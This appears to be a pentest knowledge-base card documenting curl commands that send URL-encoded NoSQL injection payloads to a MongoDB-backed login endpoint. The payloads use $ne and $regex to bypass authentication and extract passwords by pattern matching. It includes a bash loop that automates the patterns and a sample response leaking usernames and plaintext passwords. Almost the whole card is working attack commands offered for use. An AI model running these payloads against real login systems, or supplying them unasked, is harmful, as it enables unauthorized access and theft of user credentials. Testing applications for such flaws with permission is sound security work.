---
type: command
executor: bash
data: >-
  curl -X POST http://target.com/login -d
  "username[\$ne]=toto&password[\$regex]=m.{2}" -v

  curl -X POST http://target.com/login -d
  "username[\$ne]=toto&password[\$regex]=md.{1}" -v

  curl -X POST http://target.com/login -d
  "username[\$ne]=toto&password[\$regex]=mdp" -v

  curl -X POST http://target.com/login -d
  "username[\$ne]=toto&password[\$regex]=m.*" -v

  curl -X POST http://target.com/login -d
  "username[\$ne]=toto&password[\$regex]=md.*" -v
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - mongodb
verified: true
validated: true
---

# curl-nosql-injection-url-payload

## Command

```bash
curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=m.{2}" -v
curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=md.{1}" -v
curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=mdp" -v

curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=m.*" -v
curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=md.*" -v
```

## Description

This command uses curl to send URL-encoded NoSQL injection payloads to a MongoDB-backed login endpoint. It injects MongoDB operators ($ne and $regex) into the username and password parameters to extract user data matching specific password patterns, bypassing standard authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target.com/login` | The target login endpoint URL (replace with actual) | Yes |
| `-d "username[\$ne]=toto&password[\$regex]=m.{2}"` | URL-encoded payload with $ne to exclude username and $regex for password pattern matching (e.g., starts with 'm', length 3+) | Yes |
| `-v` | Verbose output to show request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=m.*" -v
```

### Advanced Usage

Chain multiple patterns in a script to test broader extractions:

```bash
for pattern in 'm.{2}' 'md.{1}' 'mdp' 'm.*' 'md.*'; do
  curl -X POST http://target.com/login -d "username[\$ne]=toto&password[\$regex]=$pattern" -v
  echo "---"
done
```

## Expected Output

Successful injection returns a 200 OK response with user data, e.g.:

```
< HTTP/1.1 200 OK
< Content-Type: application/json
<
{"success": true, "users": [{"username": "admin", "password": "monkey123"}, {"username": "user1", "password": "mypass"}]}
```
Failure might return 401 or empty results, indicating no match or sanitization.

## Related

- [[procedures/NoSQL-Injection-Extract-User-Data-MongoDB]]
- [[commands/curl-nosql-injection-json-payload]]
